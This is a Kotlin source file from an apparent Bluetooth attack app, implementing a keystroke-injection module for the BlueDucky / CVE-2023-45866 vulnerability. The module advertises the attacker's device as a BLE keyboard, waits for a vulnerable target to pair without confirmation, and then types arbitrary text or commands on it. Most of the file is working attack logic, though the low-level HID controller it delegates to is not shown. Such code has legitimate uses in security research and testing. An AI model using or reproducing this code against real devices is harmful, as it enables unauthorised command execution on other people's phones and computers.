package com.hereliesaz.blusnu.data

import kotlinx.coroutines.flow.first
import kotlinx.coroutines.withTimeoutOrNull

/**
 * Module responsible for Keystroke Injection attacks (e.g., BlueDucky / CVE-2023-45866).
 *
 * This attack exploits the "Just Works" pairing mechanism where an attacker
 * impersonates a Human Interface Device (HID) like a keyboard. On vulnerable devices,
 * the pairing occurs without user confirmation, allowing the attacker to inject
 * arbitrary keystrokes (scripts).
 *
 * Delegates all BLE HID operations to [BleHidController].
 */
class KeystrokeInjectionModule(private val hidController: BleHidController) {

    companion object {
        /** Timeout in milliseconds to wait for a BLE HID connection after advertising starts. */
        private const val CONNECTION_TIMEOUT_MS = 30_000L
    }

    /**
     * Attempts to pair with the target device as a Keyboard.
     *
     * Initializes the BLE HID GATT server and begins advertising. Waits up to
     * [CONNECTION_TIMEOUT_MS] for a remote device to connect.
     *
     * @param device The target device (used for context; the actual connection is
     *               initiated by the remote device connecting to our advertisement).
     * @return `true` if a device connected within the timeout, `false` on error or timeout.
     */
    suspend fun attemptPairing(device: TargetDevice): Boolean {
        // Initialize the GATT server (registers HID service, battery service, etc.)
        hidController.initialize()

        // Check if initialization failed
        if (hidController.connectionState.value == HidConnectionState.ERROR) {
            return false
        }

        // Start BLE advertising so the target can discover and connect to us
        hidController.startAdvertising()

        // Wait for the connection state to reach CONNECTED or ERROR
        val finalState = withTimeoutOrNull(CONNECTION_TIMEOUT_MS) {
            hidController.connectionState.first { state ->
                state == HidConnectionState.CONNECTED || state == HidConnectionState.ERROR
            }
        }

        return finalState == HidConnectionState.CONNECTED
    }

    /**
     * Injects a sequence of keystrokes (text or commands) via the BLE HID connection.
     *
     * @param text The string to type on the target device.
     * @return `true` if sent successfully, `false` if not connected.
     */
    suspend fun sendKeystrokes(text: String): Boolean {
        if (hidController.connectionState.value != HidConnectionState.CONNECTED) {
            return false
        }

        hidController.typeString(text)
        return true
    }
}
